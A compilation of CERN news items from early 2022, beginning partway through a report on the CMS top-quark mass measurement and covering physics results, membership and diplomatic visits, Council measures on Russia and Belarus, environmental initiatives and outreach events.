For example, if the masses of the W boson and Higgs boson are known accurately, the top-quark mass can be predicted by the Standard Model.
Likewise, using the top-quark and Higgs-boson masses, the W-boson mass can be predicted.  Interestingly, despite much progress, the theoretical-physics definition of mass, which has to do with the effect of quantum-physics corrections, is still tough to pin down for the top quark.
And remarkably, our knowledge of the very stability of our universe depends on our combined knowledge of the Higgs-boson and top-quark masses.
We only know that the universe is very close to a metastable state with the precision of the current measurements of the top-quark mass.
If the top-quark mass was even slightly different, the universe would be less stable in the long term, potentially eventually disappearing in a violent event similar to the Big Bang.
To make their latest measurement of the top-quark mass, using data from proton–proton LHC collisions collected by the CMS detector in 2016, the CMS team measured five different properties of collision events in which a pair of top quarks is produced, instead of the up to three properties that were measured in previous analyses.
These properties depend on the top-quark mass.
Furthermore, the team performed an extremely precise calibration of the CMS data and gained an in-depth understanding of the remaining experimental and theoretical uncertainties and their interdependencies.
With this innovative method, all of these uncertainties were also extracted during the mathematical fit that determines the final value of the top-quark mass, and this meant that some of the uncertainties could be estimated much more accurately.
The result, 171.77±0.38 GeV, is consistent with the previous measurements and the prediction from the Standard Model.
The CMS collaboration has made a significant leap forward with this new method to measure the top-quark mass.
The cutting-edge statistical treatment of uncertainties and the use of more properties have vastly improved the measurement.
Another big step is expected when the new approach is applied to the more extensive dataset recorded by the CMS detector in 2017 and 2018.

Issue with defibrillators: call 74444 in case of emergency.
CERN has been advised by the manufacturer of the defibrillators installed on site that some of the devices' electrodes may be defective.
As a result, some defibrillators may not be fully efficient but their use is not dangerous and still recommended in case of cardiac arrest.
The CERN Fire and Rescue Service has ordered new electrodes to replace deficient ones if necessary.
Stickers have also been put on the defibrillators reminding users to call 744 44 prior to using the device and to follow instructions received from the Safety Control Room operator.
To acquire basic first aid techniques in just three hours, you can enrol in CERN’s First Aid – Life-Saving Action programme.
Brazil to become an Associate Member State of CERN.
On 3 March 2022, CERN Director-General Fabiola Gianotti and Brazilian Minister for Science, Technology and Innovation Marcos Pontes signed an agreement admitting Brazil as an Associate Member State of CERN
On 3 March 2022, CERN Director-General Fabiola Gianotti and Brazilian Minister for Science, Technology and Innovation Marcos Pontes signed an agreement admitting Brazil as an Associate Member State of CERN.
The Associate Membership will enter into force once Brazil has completed all necessary accession and ratification processes.
Brazil will be the first country in Latin America to join CERN as an Associate Member State.
“We are very pleased to welcome Brazil as an Associate Member State.
Over the past three decades, Brazilian scientists have contributed substantially to many CERN projects.
This agreement enables Brazil and CERN to further strengthen our collaboration, opening up a broad range of new and mutually beneficial opportunities in fundamental research, technological developments and innovation, and education and training activities,” said Fabiola Gianotti, CERN Director-General.
“The accession of Brazil to CERN Associate Membership creates a robust framework for collaboration in research, technology development and innovation.
The Brazilian scientific community has collaborated with CERN since its creation.
Being an Associate Member State will foster novel opportunities for our scientists and engineers to participate in activities developed at CERN.
Our industry will benefit as well through the participation in contract bids for both R&D and the supply of services and materials.
I am certain that this partnership will take the Brazilian science, technology and innovation sector to a whole new level of development,” said Marcos Pontes, Brazilian Minister for Science, Technology and Innovation.
Formal cooperation between CERN and Brazil started in 1990 with the signature of an International Cooperation Agreement, allowing Brazilian researchers to participate in the DELPHI experiment at the Large Electron–Positron Collider (LEP).
Today, Brazilian institutes participate in all the main experiments at the Large Hadron Collider (LHC): ALICE, ATLAS, CMS and LHCb.
They are also involved in several other experiments and R&D programmes, such as ALPHA, ProtoDUNE at the Neutrino Platform, ISOLDE, Medipix and RD51.
Brazilian nationals also participate very actively in CERN training and outreach programmes, including the Summer Student programme, the Portuguese-Language Teacher programme and the Beamline for Schools competition.
Over the past decade, Brazil’s experimental particle-physics community has doubled in size.
At the four main LHC experiments alone, more than 180 Brazilian scientists, engineers and students collaborate in fields ranging from hardware and data processing to physics analysis.
Beyond particle physics, CERN and Brazil’s National Centre for Research in Energy and Materials (CNPEM) have also been formally cooperating since December 2020 on accelerator technology R&D and its applications.
As an Associate Member State, Brazil will attend meetings of the CERN Council and the Finance Committee.
Brazilian nationals will be eligible for limited-duration staff positions, fellowships and studentships.
Brazilian companies will be able to bid for CERN contracts, increasing opportunities for industrial collaboration in advanced technologies.
1Marcos Pontes served as Brazilian Minister for Science, Technology and Innovation until 31 March 2022.

The President of Croatia visits CERN.
The easing of health and safety restrictions has put protocol visits back on the agenda at CERN.  The President of Croatia, an Associate Member State, honoured CERN with his presence on Thursday, 7 April.
Zoran Milanović was welcomed at LHC Point 5 by the sub-prefect for Gex and Nantua, Pascaline Boulay, along with a CERN delegation that included the Director-General, Fabiola Gianotti, and several CERN Directors.
Accompanied by the spokesperson of the CMS experiment, Luca Malgeri, President Milanović took a dive into the world of CMS with a visit to the exhibition that tells the story of this large LHC experiment, before plunging, more literally this time, into the depths of the experiment area.
During his visit of the CMS technical galleries and caverns, he was shown both the LHC tunnel and the majestic detector, before returning to the surface to round off the day’s activities with a discussion with representatives of CERN’s Croatian community.
This community has grown steadily in the several decades since collaboration between CERN and Croatia began.
In the 1990s, when this collaboration was ramped up, Croatian scientists participated mainly in the SPS heavy-ion experiment programme and in the preparations for the ALICE experiment.
The contributions of Croatian users became more diversified following the signature of the International Cooperation Agreement in 2001, and even more so when the country became an Associate Member State in 2019.
Since then, around forty Croatian scientists have been involved in the ALICE and CMS experiments, as well as in non-LHC experiments, such as ISOLDE.
LHCb reveals secret of antimatter creation in cosmic collisions.
The finding may help determine whether or not any antimatter seen by experiments in space originates from dark matter
At the Quark Matter conference today and at the recent Rencontres de Moriond conference, the LHCb collaboration presented an analysis of particle collisions at the Large Hadron Collider (LHC) that may help determine whether or not any antimatter seen by experiments in space originates from the dark matter that holds galaxies such as the Milky Way together.
Space-based experiments such as the Alpha Magnetic Spectrometer (AMS), which was assembled at CERN and is installed on the International Space Station, have detected the fraction of antiprotons, the antimatter counterparts of protons, in high-energy particles called cosmic rays.
These antiprotons could be created when dark-matter particles collide with each other, but they could also be formed in other instances, such as when protons collide with atomic nuclei in the interstellar medium, which is mainly made up of hydrogen and helium.
To find out whether or not any of these antiprotons originate from dark matter, physicists therefore have to estimate how often antiprotons are produced in collisions between protons and hydrogen as well as between protons and helium.
While some measurements of the first have been made, and LHCb reported in 2017 the first-ever measurement of the second, that LHCb measurement involved only prompt antiproton production – that is, antiprotons produced right at the place where the collisions took place.
In their new study, the LHCb team looked also for antiprotons produced at some distance from the collision point, through the transformation, or “decay”, of particles called antihyperons into antiprotons.
To make this new measurement and the previous one, the LHCb researchers, who usually use data from proton–proton collisions for their investigations, used instead data from proton–helium collisions obtained by injecting helium gas into the point where the two LHC proton beams would normally collide.
By analysing a sample of some 34 million proton–helium collisions and measuring the ratio of the production rate of antiprotons from antihyperon decays to that of prompt antiprotons, the LHCb researchers found that, at the collision energy scale of their measurement, the antiprotons produced via antihyperon decays contribute much more to the total antiproton production rate than the amount predicted by most models of antiproton production in proton–nucleus collisions.
“This result complements our previous measurement of prompt antiproton production, and it will improve the predictions of the models,” says LHCb spokesperson Chris Parkes.
“This improvement may in turn help space-based experiments find evidence of dark matter.”
“Our technique of injecting gas into the LHCb collision point was originally conceived to measure the size of the proton beams,” says LHCb physics coordinator Niels Tuning.
“It is really nice to see again that it also improves our knowledge of how often antimatter should be created in cosmic collisions between protons and atomic nuclei.”

Higgs10 – save the date!.
On 4 July 2012, half a century’s wait came to an end as the ATLAS and CMS experiments announced the discovery of the Higgs boson.
Ten years on, we mark the occasion and look forward to a bright future for Higgs research.
The centrepiece of the Higgs10 celebrations is a full-day scientific symposium in CERN’s main auditorium on 4 July.
This will celebrate the discovery, give an overview of what’s been learned since then, and take a look forward at what’s still to come.
On the eve of the symposium, there will be a public screening of the film Particle Fever at the Globe, followed by a discussion with CERN scientists and other symposium speakers.
Similar events with local scientists are being organised in communities across the region from late April to June.
Throughout the CERN Member States and at partner laboratories around the world, events ranging from science cafés to lunchtime exhibits for decision-makers are being prepared.
Look out too for a series of articles in the Bulletin, a special issue of the CERN Courier and new content on the home.cern website.
Full details will be published soon but, in the meantime, save the date of 4 July 2022 and make sure you don’t miss out!
Environmental awareness: the importance of environmental considerations for future projects.
Pursuing CERN’s scientific mission through environmentally responsible research
Long-term environmental sustainability is one of the key factors assessed in the authorisation process of future research infrastructures and projects in the realm of particle physics research.
For years, the term “environment” was associated only with nature and the preservation of ecosystems.
More recently this definition has expanded to include urban landscapes and the embedded socio-economic activities.
This more holistic approach takes into account the relationships between different aspects of the environment when planning the future of particle physics research.
In 2020, the European Strategy for Particle Physics, the cornerstone of Europe’s decision-making process for the long-term future of the field, was updated following almost two years of discussions between particle physicists in Europe and around the world.
In the process, a report from 180 young scientists highlighted the importance of environmentally responsible and sustainable decisions for the future of particle physics.
The updated European Strategy has a dedicated chapter on “environmental and societal impact”, stating that the environmental impact of particle physics should continue to be carefully studied while striving to increase the net benefits from the realisation of a new facility.
It recommends that major projects integrate sustainability in their design and include a detailed plan for reducing their environmental impact, and that wider environmental applications for technologies developed in particle physics be actively sought.
In the framework of the feasibility study for the Future Circular Collider, a possible future accelerator based at CERN that may succeed the LHC at the end of its lifetime, different working hypotheses are being developed for the placement of the 91-km-circumference tunnel and its eight surface sites.
These working hypotheses take into account the geological conditions, surface constraints, infrastructure and resources, and are based on the “Éviter, Réduire, Compenser” (Avoid, Reduce, Compensate) principle, a comprehensive approach that integrates environmental and socio-economic aspects.
Given the extent of excavation that would be required to build the FCC accelerator tunnel, a working group on the management of excavated materials was created in 2018.  On this same topic, the Mining the future competition was launched.
The competition challenges participants to identify credible solutions for innovative reuse and sustainable management of the estimated large quantities of excavated materials.
Reducing the environmental impact of particle physics research is firmly on the agenda, and is also reflected in CERN’s current main objectives for 2021–2025: to minimise the Laboratory’s impact on the environment, pursue actions and technologies aiming at energy saving and reuse and, going further, identify and develop CERN technologies that may contribute to mitigating the impact of society on the environment.
Recent initiatives linked to these objectives include a project to assess how to “green” CERN’s procurement strategy and the launch of the CERN Innovation Programme for Environmental Applications (CIPEA).
These core environmental considerations, which, as required by the approval process for any new project, are linked to clear commitments, ensure that our scientific research is pursued responsibly, for the benefit of all.  This article is part of the series “CERN’s year of environmental awareness”.
CERN joins a first-of-its-kind global celebration of World Quantum Day.
14 April 2022 marks the first anniversary of World Quantum Day – an international initiative launched by scientists from more than 65 countries to promote public understanding of quantum science and technology worldwide.
To mark the first anniversary of this global celebration, CERN is organising a scientific symposium comprising a series of talks highlighting different areas of the quantum research field.
From the history of quantum information to examples of concrete quantum-related projects already under way at CERN, the discussions will explore the past, present and future of quantum science and technology within the high-energy physics (HEP) community and beyond.
Among the keynote speakers are John Ellis and Nicolas Gisin.  In their joint opening talk, they will outline the early days of quantum science at CERN and what that pioneering effort means for modern research.
Their talk will be followed by three presentations on experimental quantum physics, quantum computing applications and the CERN Quantum Technology Initiative (QTI).
The event will take place in the CERN Council Chamber on 14 April from 4.30 to 6.00 p.m.  CEST and will also be webcast live: Some previous knowledge of quantum physics is required to follow the talks, except for the final presentation on CERN QTI, which will aim to provide a broad overview of quantum-related research and educational activities at CERN.
At the end of the session, there will be a Q&A session for attendees wanting to find out more about quantum technologies and the way they could benefit our society.
Full information – including a list of speakers and how you can register – is available on the event page:

Primary schools’ challenge: Archana Sharma and Pieter Mattelaer round off the investigations.
At a considerable advantage thanks to the previous teams’ findings, will Archana and Pieter finally work out what’s in the boxes?
In June 2021, to mark the 10th anniversary of the Be a Scientist project, pupils from Jean de la Fontaine school (Prévessin-Moëns, France) and Cérésole school (Petit-Lancy, Switzerland) set a challenge for CERN's scientists.
Their task?
To find out what was inside two boxes without opening them!
For ten years now, schools in Geneva, the Pays de Gex and Haute-Savoie have been receiving mystery boxes from CERN.
The pupils, aged between 8 and 12, produce hypotheses, collect data and use factual information to determine the boxes’ contents.
This year, the roles were reversed.
On the advice of Dorota Grabowska and Alberto Di Meglio, the previous team to take up the investigation, the boxes were X-rayed.
In the hall of CERN’s Building 40, Archana and Pieter were thus able to round off the investigation with a significant advantage.
Thanks to these helpful images, the duo made numerous discoveries, validating some of their predecessors’ hypotheses.
Which of the previous four pairs was right?
Is there a metal detector in the French box, or a little bell in the Swiss one?
Watch this space – the boxes will be opened and the contents revealed in the next and final episode of the Schools Challenge!
Visit voisins.cern for regular updates on the challenge and to follow the progress of the investigation by the CERN community.

Swiss Ambassador to France visits CERN by bike as part of the “En route avec la Suisse” project.
The goal of the “En route avec la Suisse” project is to promote Switzerland in France by showcasing the country’s innovative and sustainable credentials
As an international organisation, CERN regularly hosts protocol visits, some of which are particularly memorable.
This was certainly the case when the Swiss Ambassador to France came to CERN on Tuesday, 29 March: Roberto Balzaretti rode through the CERN site on an electric bicycle as part of his unique tour of France.
A proponent of sustainable modes of transport, the Ambassador is criss-crossing France by bicycle in 12 stages.  He embarked on the first stage – dedicated to the Auvergne-Rhône-Alpes region – at the end of March.
Having set off from Aigle, in the Swiss canton of Vaud, he cycled through Saint-Gingolph, Thonon-les-Bains, Annemasse and Geneva before arriving at CERN.
CERN, which was recently awarded the ecomobility prize by the Ain Energy and Climate Agency, was keen to welcome the Ambassador.
Accompanied by the General Consul for Switzerland in Lyon, Pascal Bornoz, the Ambassador was greeted at CERN's Mobility Centre by the CERN Director for International Relations, Charlotte Lindberg Warakaulle, and representatives of the Relations with the Host States service, the Site and Civil Engineering department, the Mobility Centre and the CERN cycling club.
The welcome committee escorted the Ambassador and his entourage by bicycle from Gate A in Switzerland to Gate E in France.
Before continuing on their journey to Lyon, the visitors made a symbolic stop at the CERN border crossing.
The visit was an opportunity for the participants to discuss their respective institutions’ commitment to sustainable modes of transport and to underline the importance of cross-border relations for France and Switzerland and for CERN.
The goal of the “En route avec la Suisse” project is to demonstrate the extremely rich and close ties between France and Switzerland by engaging with the Swiss community in France (prominent figures and people with economic, scientific and cultural links to Switzerland) while strengthening bilateral and cross-border relations.
The Ambassador chose to ride an electrically assisted bicycle developed by a Swiss company in order to emphasise the country’s commitment to sustainable transport, sport and innovation.
Research and industry unite at 2022 CERN openlab Technical Workshop.
CERN openlab brings together IT experts from research and industry to address the computing challenges posed by the LHC’s ambitious upgrade programme
Over 200 people attended the 2022 CERN openlab Technical Workshop.
The event was run online over three days, from 21 to 23 March.
It saw leading computing experts from research and industry come together to discuss the work carried out through 32 joint R&D projects spread across CERN.
CERN openlab is a unique public–private partnership, through which CERN collaborates with leading technology companies.
For 20 years, this partnership has been working to accelerate innovation in the computing technologies required by the LHC research community.
Today, there are over 20 companies and research organisations working together in CERN openlab.
Industry members include Intel, Oracle, Siemens, Micron and Google.
At the 2022 CERN openlab Technical Workshop, project teams shared their progress and discussed upcoming IT challenges related to the LHC’s ambitious upgrade programme.  “Through CERN openlab, we are working with industry leaders to tackle tomorrow’s IT challenges today,” says Enrica Porcari, head of the CERN IT Department.
“These challenges are relevant to a growing range of scientific fields, as well as wider society.
Through collaboration with CERN’s Knowledge Transfer group and dedicated R&D projects focused on sharing knowledge and tools with other communities, CERN openlab plays an important role in contributing to CERN’s positive impact on society.”
Exascale, AI, quantum computing and more
A particular highlight from the first day of the workshop, dedicated to exascale computing technologies, was the opening technical presentation, which focused on the Allen project.
This project has developed a new, more efficient system that sees the first level of the LHCb experiment’s data-filtering ‘trigger’ system move to running on graphical processing units (GPUs), rather than general-purpose central processing units (CPUs).
The second day of the workshop focused on two separate topics, AI and collaborations with research beyond particle physics, with presentations on both the potential of advanced AI for data analysis at CERN and CERN openlab’s impact on various fields such as quantum encryption, climate modelling and satellite imagery to support humanitarian interventions.
The third day focused on quantum technologies, including presentations on the CERN Quantum Technology Initiative (QTI), an exciting new venture that published its first strategic roadmap in October 2021.
Working together to tackle tomorrow’s IT challenges today
During 2022, the CERN openlab team will carry out work to strengthen existing collaborations with industry, finalising plans for a range of exciting R&D projects, as well as establishing new collaborations to address emerging IT challenges.
“CERN openlab has built deep connections between members of CERN’s research community and the R&D teams at the leading technology companies participating in this partnership.
It is testament to the strength of these connections that we have been able to both grow our collaborations and make important technical progress on projects over the last two years when in-person interaction has been severely limited,” says Maria Girone, CERN openlab’s Chief Technology Officer.
“We are now looking forward to resuming face-to-face meetings with our collaborators and to welcoming the 2022 cohort of CERN openlab summer students to the CERN site in July.”
CERN’s response to the invasion of Ukraine: new Council measures.
Following the resolutions adopted at the March session of the CERN Council, the Director-General sent the following message to the CERN personnel
As you know, the CERN Council has been meeting this week.
CERN’s response to Russia’s invasion of Ukraine was among the main topics of discussion.
CERN was born from the ashes of World War II to promote excellence in scientific research and peaceful collaboration across borders.
Over seven decades, the Organization has become a powerful symbol of what people can achieve when they put their differences aside and work together in pursuit of common goals for the benefit of all humanity.
Our Member States are very conscious of this heritage, and the importance of preserving it into the future.
This brutal invasion puts us in an unprecedented situation, requiring strong measures to be taken to preserve this legacy.
Following the adoption of two Resolutions by the Council today, one concerning Russia and Belarus, the other the Joint Institute for Nuclear Research (JINR) based in Dubna, the Council has agreed on a statement, which I am appending to this email, outlining the new measures that were approved today.
The full text of the Resolutions will be available shortly in English and French on the CERN Council’s webpages and also made available through the CERN website and the ‘Solidarity with Ukraine’ webpage.
The measures concerning Russia and Belarus reinforce those adopted by the Council at the Extraordinary Session on 8 March.
The Council will take a decision in June on whether to suspend all collaborations with Russian and Belarusian institutes and with JINR.  In the meantime, CERN management will work through the full implications of such a move, developing a scenario to address the issue in a manner that is the least disruptive to individuals and CERN’s scientific activities.
Since the invasion, several actions have been initiated by the Organization to support members of our Ukrainian community and their families, as well as the Ukrainian population more generally.
Further measures are under discussion with our Ukrainian colleagues. The collection initiated by the Staff Association and supported by the Management raised a total of 820 000 Swiss francs, consisting of individual donations from CERN personnel, matched by the CERN Directorate from the CERN budget, with a contribution of 15 000 Swiss francs from the Staff Association.
These funds will be transferred to the Red Cross for its humanitarian operations in Ukraine and neighbouring countries.
We would like to thank you very much for your generosity, and for all the very moving and practical initiatives that many of you have taken to support our Ukrainian colleagues and the Ukrainian people.
CERN Council takes further measures in response to the invasion of Ukraine
In response to the military invasion of Ukraine by the Russian Federation, the 23 Member States of CERN today decided to:
- suspend the participation of CERN scientists in all scientific committees of institutions located in the Russian Federation and the Republic of Belarus, and vice versa;
- suspend or, failing that, cancel all events jointly arranged between CERN and institutions located in the Russian Federation and the Republic of Belarus;
- suspend the granting of contracts of association as associated members of the CERN personnel to any new individuals affiliated to home institutions in Russia and Belarus.
Regarding relations with the Joint Institute for Nuclear Research (JINR), with which CERN holds reciprocal Observer status, the CERN Council decided:
- to suspend the participation of CERN scientists in all JINR scientific committees, and vice versa;
- to suspend or, failing that, cancel all events jointly arranged between CERN and JINR;
- that CERN will not engage in new collaborations with JINR until further notice;
- that the Observer status of JINR at the Council is suspended and CERN will not exercise the rights resulting from its Observer status at JINR, until further notice.
The CERN Council also decided that, with a view to making a decision at its Session in June 2022 on the suspension of the international cooperation agreements and the related protocols and addenda, as well as any other agreements, including mutatis mutandis experiment memoranda of understanding, allowing for the participation of the Russian Federation and the Republic of Belarus, their national institutes and JINR in the CERN scientific programme, the Council will consider additional information and an action plan, and will further analyse the full consequences of such a decision.
The 23 Member States of CERN reiterate their condemnation, in the strongest terms, of the military invasion of Ukraine by the Russian Federation and strongly condemn the statements by those Russian institutes that have expressed support for the illegal invasion of Ukraine.
The CERN Council emphasised that the unprovoked and premeditated attack on Ukraine has caused widespread loss of life and a humanitarian crisis.
Therefore, the Council stressed that its decisions are taken to express its solidarity with the Ukrainian people and its commitment to science for peace.
The core values of the Organization have always been premised upon scientific collaboration across borders as a driver for peace.
Therefore, the aggression of one country by another runs against the values for which the Organization stands.
The measures agreed on today complement those adopted at the CERN Council’s Extraordinary Session held on 8 March, whereby it supported initiatives in favour of the Ukrainian scientific community, condemned the military invasion of Ukraine by the Russian Federation with the involvement of Belarus, suspended the Observer status of the Russian Federation until further notice, and decided that CERN would not engage in new collaborations with the Russian Federation and its institutions until further notice.

Mass matters when quarks cross a quark–gluon plasma.
A new analysis by the ALICE collaboration confirms the expected role of quark mass in the interactions of quarks with a quark–gluon plasma
Unlike electrons, quarks cannot wander freely in ordinary matter.
They are confined by the strong force within hadrons such as the protons and neutrons that make up atomic nuclei.
However, at very high energy densities, such as those that are achieved in collisions between nuclei at the Large Hadron Collider (LHC), a different phase of matter exists in which quarks and the mediators of the strong force, gluons, are not confined within hadrons.
This form of matter, called a quark–gluon plasma, is thought to have filled the universe in the first few millionths of a second after the Big Bang, before atomic nuclei formed.
At the Rencontres de Moriond conference today, the ALICE collaboration at the LHC reported an analysis of head-on collisions between lead nuclei showing that quark mass matters when quarks cross a quark–gluon plasma.
Hadrons containing charm and beauty quarks, the heavier cousins of the up and down quarks that make up protons and neutrons, offer an excellent way to study the properties of the quark–gluon plasma, such as its density.
A charm quark is much heavier than a proton, and a beauty quark is as heavy as five protons.
These quarks are produced in the very first instants of the collisions between nuclei, before the formation of the quark–gluon plasma that they then traverse.
Therefore, they interact with the plasma’s constituents throughout its entire evolution.
Just like electrically charged particles crossing an ordinary gas can tell us about its density, through the energy they lose in the crossing, heavy quarks can be used to determine the density of the quark–gluon plasma through the energy they lose in strong interactions with the plasma’s constituents.
However, before using the energy loss in the plasma to measure the plasma’s density, physicists need to validate the theoretical description of this loss.
A fundamental prediction of the theory of the strong force is that quarks that have a larger mass lose less energy than their lighter counterparts because of a mechanism known as the dead-cone effect, which prevents the radiation of gluons and thus of energy in a cone around the quark’s direction of flight.
In their new study of head-on collisions between lead nuclei, the ALICE collaboration tested this prediction using measurements of charm-quark-containing particles called D mesons.
They measured D mesons produced right after the collisions from initial charm quarks, called ‘prompt’ D mesons, as well as ‘non-prompt’ D mesons produced later in the decays of B mesons, which contain the heavier beauty quarks.
They presented the measurements in terms of the nuclear modification factor, which is a scaled ratio of particle production in lead–lead collisions to that in proton–proton collisions (figure below).
They found that the production of non-prompt D mesons (blue markers in the figure) in lead–lead collisions is less suppressed than that of prompt D mesons (red markers).
These results are described well by models in which beauty quarks lose less energy than charm quarks in the quark–gluon plasma, because of their larger mass.
They thus confirm the theoretical expectations of the role of quark mass in the interactions of quarks with the quark–gluon plasma.
In addition, the measurements are sensitive to B mesons that have low energies.
This is crucial when it comes to using beauty quarks to determine the density and other properties of the plasma.
Further measurements with the upgraded ALICE detector in the next run of the LHC, which is scheduled to start this coming summer, will help to better understand the theoretical description of the energy loss that quarks experience when they cross the quark–gluon plasma.

ATLAS nets top quark produced together with a photon.
With its high statistical significance, the result represents the first observation of electroweak top-quark–photon production
The top quark is very special.
It’s the heaviest known elementary particle and therefore strongly interacts with the Higgs boson.
The top quark’s interactions with other particles provide promising leads for searches for physics beyond the Standard Model.
By taking accurate measurements of its properties using rare processes, physicists can explore new physics phenomena at the highest energies.
At the ongoing Rencontres de Moriond conference, the ATLAS collaboration at the Large Hadron Collider (LHC) announced the observation of one of these rare processes: the production of a single top quark in association with a photon through the electroweak interaction.
With a statistical significance well above five standard deviations, the result represents the first observation of top-quark–photon production.
This achievement was far from straightforward, as the search for this process was dominated by a large number of background collision events that mimic top-quark–photon production.
In their new analysis, the ATLAS researchers analysed the full LHC Run 2 data set, recorded by the detector between 2015 and 2018.
They focused on collision events where the top quark decays via a W boson to an electron or a muon and a neutrino, and to a bottom quark.
They further narrowed their search by seeking out a particular characteristic of top-quark–photon events: a “forward jet”, which is a spray of particles that is commonly produced and travels at small angles to the LHC’s proton beams.
To separate the top-quark–photon events from the background events, the ATLAS researchers used a neural network, which receives as input a number of variables or features, and finds the combination of those features that most accurately classifies a data event according to signal or background types.
The statistical significance of the ATLAS measurement of top-quark–photon production is 9.1 standard deviations – well above the 5 standard-deviation threshold required to claim observation of a process in particle physics.
The expected significance, based on the Standard Model prediction, was 6.7 standard deviations.
This exciting measurement will allow physicists to look for hints of new interactions that might exist beyond the reach of the LHC.
In particular, physicists can now use this process to infer information on new particles that could alter the top-quark–photon interaction.
Further studies with new analysis techniques and a significantly larger data set from the upcoming Run 3 of the LHC promise an exciting road ahead.

Two years of COVID-19 measures at CERN: Thank you for your commitment and your resilience.
With the move to COVID-19 Level 1 – Green on Monday, 14 March, I feel hopeful that the worst of the pandemic is behind us, even though we all need to remain vigilant, safe and responsible.
On behalf of the CERN Management, this is a “thank you” to the CERN community at large, for your commitment and resilience during these unprecedented times.
The unique geographical situation of CERN, straddling two Host States, and the diversity of its workforce and stakeholders made the design of suitable COVID-19 measures a particular challenge.
We met this challenge by displaying a spirit of inclusiveness that accommodated different opinions and by staying as science-based as possible.
A comprehensive set of measures, including effective testing and contact-tracing programmes, enabled us to limit on-site transmission and keep the Laboratory open and safe to pursue its mission.
Innovation, commitment and creativity shone through many COVID-related initiatives.
At the beginning of the pandemic, CERN reached out to its neighbours by creating a dedicated COVID-19 taskforce and reinforcing the local emergency response with the support of the CERN Fire and Rescue Service.
The CARA (COVID Airborne Risk Assessment) tool, which was developed to model the concentration of viruses in enclosed spaces to help with space management during the pandemic, has since been adopted beyond CERN’s confines and will help in the longer term to ensure good air quality in workspaces.
In addition, an on-site vaccination centre catered for colleagues and their family members living in both France and Switzerland.
These are just a few examples of the collective efforts made.
Throughout, all the CERN teams worked side by side.
Dedicated health and safety measures, HR support and COVID helplines were coordinated and brought together on our dedicated HSE webpages to keep you informed at all stages of the pandemic.
The implementation of the four-level COVID-19 scale last June was yet another joint effort that enabled a swift adjustment of the many impacted services at all stages of the pandemic.
The situation is being continuously monitored as the coronavirus is still circulating and is set to become part of our lives.
With fewer measures in Level 1 – Green, we will all have to learn how to live and work safely with the virus, in a spirit of respect and tolerance, all the while breathing life back into our unique campus-like environment: a place where we can favour face-to-face exchanges to fuel our innovative minds, while ensuring due protection for those who are vulnerable and at higher risk.
For my part, having taken the helm of the HSE unit at the start of 2021, I look forward to continuing to work closely with all our partners who have helped us to successfully meet the challenges of the pandemic and, more generally, with the CERN community on a range of other subjects within the wider mission of the HSE unit.
Together, we will strive to support research and innovation by building sustainable and healthy foundations.
Environmental awareness: reducing the energy consumption of CERN’s IT infrastructure.
Energy consumption related to data processing is one of the main environmental impacts of CERN’s IT infrastructure and activities.
Around 75% of the energy used in data centre activities at CERN is for data processing, while the remaining 25% is dedicated to data storage.
As shown in this infographic, three main actors could contribute to reducing energy consumption in data processing, thereby reducing CERN’s environmental impact: industry, CERN as an organisation, and the CERN community.
Read more on how CERN is working to reduce the environmental impact of its IT infrastructure here.
This infographic is part of the series “CERN’s Year of Environmental Awareness”.

Thirty years of Hungarian membership of CERN: the President of the Republic visits the Organization.
President Áder visited the CMS cavern and the Globe of Science and Innovation to mark the anniversary of his country joining CERN
Like many central and eastern European countries, Hungary became a CERN Member State following the fall of the Iron Curtain.
The country’s president, János Áder, came to CERN on 8 March 2022 on an official visit to see for himself the fruits of thirty years of shared history.
Accompanied by his wife, Anita Herczegh, and his delegation, the President met the Director-General, Fabiola Gianotti, and several CERN Directors, as well as the spokesperson of the CMS collaboration, Luca Malgeri, at Point 5 of the Large Hadron Collider (LHC).
Following preliminary discussions, the President visited the CMS experiment cavern and learned all about the research being carried out at CERN.
His delegation then visited the Globe of Science and Innovation, where he participated in a roundtable discussion with Hungarian scientists.
Following an exchange of gifts, the President rounded off his visit with a stop at the Science Gateway site, where work continues in front of the Globe.
Since Hungary became a CERN Member State in 1992, its relationship with the Laboratory has gone from strength to strength, with many Hungarian scientists involved in the ALICE, CMS and LHCb experiments at the LHC, as well as in research programmes on antimatter and the development of new accelerator technologies.
The country also hosts, at the Wigner Research Centre for Physics in Budapest, a major Worldwide LHC Computing Grid centre, where data collected by the collider is processed.
Writing up the results: award-winning writers visit CERN.
Stories inspired by the visit will be published in an anthology later this year
On Friday, 11 March, a delegation of internationally acclaimed fiction writers visited CERN as part of an undertaking pairing authors with CERN scientists to explore the science and theory behind CERN's work through fiction.
The writers included science-fiction author Ian Watson (whose credits include the screen story for the film A.I.), BBC National Short Story Award winner Lucy Caldwell, and novelist and screenwriter Courttia Newland (who recently worked with director Steve McQueen on the award-winning Small Axe series).
During their stay, the writers visited CMS, the Antiproton Decelerator, the Data Centre and the Synchrocyclotron.
The project is supported by UK Research and Innovation (UKRI) and the Science and Technology Facilities Council (STFC) as part of HL-LHC-UK phase 2 and has been devised as an alternative to the usual process of reflecting on, and disseminating, new research ideas.
Writers and scientists work together to exchange ideas, with the latter acting as consultants to make sure the science is accurately represented.
The scientists also write short afterwords to accompany the finished fictions, explaining and contextualising the story's science in an accessible way to the general reader.
The project is part of the wider “science-into-fiction” series initiated by Comma Press, a British publishing house, which has produced seven books to date.
The project is coordinated by the University of Manchester and Cockcroft Institute, and CERN.
The stories inspired by this visit and the various surrounding consultations will be published later this year in an anthology and will be launched at various festivals in the United Kingdom later in the year.
ORIGIN-CMS exhibition in Seoul – it’s a wrap!.
An exhibition centre in South Korea was “wrapped” in CMS for six months last year.  The innovative science, art and education exhibition is still accessible online.
From May to October last year, Hanyang University in Seoul, South Korea, housed a cross-disciplinary SciArtEdu (science, art and education) exhibition designed by the South Korean particle physics community and local artists with the support and participation of CMS and members of the local ORIGIN collaboration*, which includes ALICE, LIGO and ICEcube.
For the six-month duration of the exhibition, the 15 m-high exhibition centre building was wrapped with an image of CMS, creating an eye-catching scene in the centre of the city.
Inside the vast building, curious visitors discovered a unique exhibition created by ORIGIN-CMS curator Michael Hoch in collaboration with the museum staff, local and international scientific colleagues and artists.
The exhibition, entitled "The Cosmonaut", examined humankind's millennia-old quest to understand the mysteries of the cosmos, connecting this quest to current particle physics research using displays of real objects, photos, videos and text, and juxtaposing them with contemporary artistic representations.
Although the exhibition took place during the pandemic, which restricted in-person access, a comprehensive virtual programme was organised, including regular presentations, meetings with scientists and artists, and scientific and artistic educational workshops specifically designed for teachers and students.
Rather than limiting the impact of the exhibition, the pandemic restrictions encouraged and inspired the organisers to reach out to a much wider audience by recording the events and the entire exhibition for virtual access.
